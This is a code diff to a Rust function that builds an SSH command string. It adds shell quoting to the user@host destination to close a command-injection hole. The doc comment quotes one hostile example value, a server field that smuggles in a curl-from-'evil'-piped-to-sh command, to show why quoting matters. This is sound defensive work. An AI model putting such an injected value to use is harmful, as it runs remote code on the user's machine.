@@ -344,11 +344,16 @@ fi
 ///
 /// Shaped so Warp's own SSH wrapper still recognises it: `-i`/`-p` are getopts
 /// options and `--` fences a *single* positional destination, which is what the
-/// warpification gate in `bash_body.sh` requires. Two things it deliberately
-/// does not do: append the remote path as a command (a second positional would
-/// silently drop warpification — U7 lands in the path afterwards instead), and
-/// leave the identity unquoted (a space in it word-splits into that same second
-/// positional, KTD10).
+/// warpification gate in `bash_body.sh` requires. It deliberately does not
+/// append the remote path as a command: a second positional would silently drop
+/// warpification, so U7 lands in the path afterwards instead.
+///
+/// Every user-entered value is quoted (KTD10). This string is typed into the
+/// *local* shell, so an unquoted field is direct command execution, not merely a
+/// word-splitting hazard — `server = "h; curl evil | sh"` would run. Quoting is
+/// safe for warpification because `is_interactive_ssh_session` in
+/// `bash_body.sh` counts positionals *after* the shell has word-split and
+/// stripped quotes, so a quoted destination is still exactly one `ARGS` entry.
 pub fn remote_ssh_command(target: &RemoteTarget) -> String {
     let mut command = String::from("ssh");
     if !target.identity.is_empty() {
@@ -356,7 +361,7 @@ pub fn remote_ssh_command(target: &RemoteTarget) -> String {
         command.push_str(&shell_quote(&target.identity));
     }
     command.push_str(&format!(" -p {} -- ", target.port));
-    command.push_str(&target.user_host());
+    command.push_str(&shell_quote(&target.user_host()));
     command
 }
 
